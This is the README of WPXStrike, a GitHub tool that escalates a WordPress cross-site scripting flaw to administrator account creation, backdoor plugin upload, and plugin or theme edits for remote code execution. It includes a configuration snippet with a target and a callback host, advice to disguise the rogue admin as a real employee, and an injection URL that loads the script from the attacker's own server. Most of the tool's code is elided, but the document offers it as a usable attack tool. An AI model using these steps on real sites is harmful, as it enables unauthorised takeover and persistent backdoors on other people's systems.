
<h1 align="center">
  <br>
  <img src="https://github.com/nowak0x01/WPXStrike/assets/96009982/36f99c00-31f9-45fa-ab4d-746481a16de4" alt="WPXStrike" width="350">
  <br>
  WPXStrike
  <br>
</h1>



<h4 align="center">WordPress Exploitation Script that elevate XSS to RCE or Others Critical Vulnerabilties</a>.</h4>

<p align="center">
  <a href="#about">About</a> •
  <a href="#key-features">Key Features</a> •
  <a href="#how-to-use">How To Use</a> •
  <a href="#examples">Examples</a> •
  <a href="#contributing">Contributing</a>
</p>

![screenshot](https://github.com/nowak0x01/WPXStrike/assets/96009982/c9cd4b27-e93d-4e90-bd69-b10c0fe36e60)

## About
_**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress.

## Key Features

* _**Privilege Escalation**_
  - Creates an user in WordPress.
* _**(RCE) Custom Plugin (backdoor) Upload**_
  - Upload your custom plugin (backdoor) to WordPress.
* _**(RCE) Built-In Plugin Edit**_
  - Edit a Built-In Plugins in WordPress.
* _**(RCE) Built-In Theme Edit**_
  - Edit a Built-In Themes in WordPress.
* _**(Custom) Custom Exploits**_
  - Custom Exploits for Third-Party WordPress Plugins/Themes.
  
## How To Use
https://github.com/nowak0x01/WPXStrike/assets/96009982/05ae1c34-5c0c-4ee5-b80e-0c8c270dbba0

1\) Clone the Repository
```bash
git clone https://github.com/nowak0x01/WPXStrike
```

2\) Edit the script by selecting the desired function, modifying its variable values and select the module. (Example: _**WPCreateAccount()**_)
```
// ************************************ ~% Variables %~ ************************************ //

var Target = "https://wordpress.example.com/"; // Ex: https://172.16.0.13:8000/wordpress/
var Callback = "https://fqgx7638bcvddnsrufh3nxbozd.oastify.com/"; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).

// ************************************ ~% Functions %~ ************************************ //

WPCreateAccount(); // (Privilege Escalation) - Creates an user in WordPress.
// WPUploadCustomPlugin(); // (RCE) - Upload your custom plugin (backdoor) to WordPress.
// WPEditPlugins(); // (RCE) - Edit a Built-In Plugins in WordPress.
// WPEditThemes(); // (RCE) - Edit a Built-In Themes in WordPress.
// CustomExploits(); // (Custom) - Custom Exploits for Third-Party WordPress Plugins/Themes.

function WPCreateAccount() {

    /* ************************************************************************************************************************************************ */
    var Username = "nowak";         // Ex: operator (It is recommended to use a valid employee name from the target company).
    var Password = `j^QEkyvd7*g3xqsE`;          // (weak password are allowed).
    var Email = "nowak@example.com";  // Ex: user@company.net (It is recommended to use a business email from the target company) (No email will be sent to the email address entered).
    var Role = "administrator";                 // Ex: administrator, editor, author, contributor, subscriber.
    var FirstName = ""; // (optional)
    var LastName = "";  // (optional)
    /* ************************************************************************************************************************************************ */

    // ************************************ ~% WPCreateAccount Modules %~ ************************************ //
    // [#] Choose one of the available modules [#] //
    WPXCreateAccount(); // Wordpress Create Account Module for Wordpress 6.X.X, 5.X.X and 4.X.X.
    /* ************************************************************************************************************************************************ */

    // Wordpress Create Account Module for Wordpress 6.X.X, 5.X.X and 4.X.X.
    function WPXCreateAccount() {
      ...
    }

```

3\) Start a web server
```bash
php -S 0.0.0.0:80 -t .
```

4\) Go to the WordPress XSS vector and include _**WPXStrike.js**_
```
https://wordpress.example.com/?search=<script%20src="//YOURIP/WPXStrike.js"></script>
```

## Examples
**_WPCreateAccount()_ - Creates an user in WordPress.**

https://github.com/nowak0x01/WPXStrike/assets/96009982/60940909-e13c-4161-9638-864cab36fdcd

**_WPUploadCustomPlugin()_ - Upload your custom plugin (backdoor) to WordPress.**

https://github.com/nowak0x01/WPXStrike/assets/96009982/08deea5f-acd2-412c-b248-28a71b0ff96d

**_WPEditThemes()_ - Edit a Built-In Themes in WordPress.**

https://github.com/nowak0x01/WPXStrike/assets/96009982/ae52c7cf-26f2-44f7-aed2-e4493874bdf1

**_WPEditPlugins()_ - Edit a Built-In Plugins in WordPress.**

https://github.com/nowak0x01/WPXStrike/assets/96009982/b744d37c-bf17-4fc4-8cb1-6ede389da6c7

**_CustomExploits()_ - Custom Exploits for Third-Party WordPress Plugins/Themes**.<br>
// pending

# Contributing
If you're interested in contributing, enhancing the existing code, your efforts would be immensely appreciated. Your contributions will play a key role in making this project even better.
<pre>
              ;,_            ,
                 _uP~"b          d"u,
                dP'   "b       ,d"  "o
               d"    , `b     d"'    "b
              l] [    " `l,  d"       lb
              Ol ?     "  "b`"=uoqo,_  "l
            ,dBb "b        "b,    `"~~TObup,_
          ,d" (db.`"         ""     "tbc,_ `~"Yuu,_
        .d" l`T'  '=                      ~     `""Yu,
      ,dO` gP,                           `u,   b,_  "b7         
     d?' ,d" l,                           `"b,_ `~b  "1
   ,8i' dl   `l                 ,ggQOV",dbgq,._"  `l  lb      WPXStrike (https://github.com/nowak0x01/WPXStrike)
  .df' (O,    "             ,ggQY"~  , @@@@@d"bd~  `b "1
 .df'   `"           -=@QgpOY""     (b  @@@@P db    `Lp"b,
.d(                  _               "ko "=d_,Q`  ,_  "  "b,
Ql         .         `"qo,._          "tQo,_`""bo ;tb,    `"b,
qQ         |L           ~"QQQgggc,_.,dObc,opooO  `"~~";.   __,7,
qp         t\io,_           `~"TOOggQV""""        _,dg,_ =PIQHib.
`qp        `Q["tQQQo,_                          ,pl{QOP"'   7AFR`
  `         `tb  '""tQQQg,_             p" "b   `       .;-.`Vl'
             "Yb      `"tQOOo,__    _,edb    ` .__   /`/'|  |b;=;.__
                           `"tQQQOOOOP""`"\QV;qQObob"`-._`\_~~-._
                                """"    ._        /   | |oP"\_   ~\ ~\_~\
                                        `~"\ic,qggddOOP"|  |  ~\   `\~-._
                                          ,qP`"""|"   | `\ `;   `\   `\
                               _        _,p"     |    |   `\`;    |    |
    @Author: Hudson Nowak      "boo,._dP"       `\_  `\    `\|   `\   ;
                                 `"7tY~'            `\  `\    `|_   |
                                                      `~\  |
</pre>
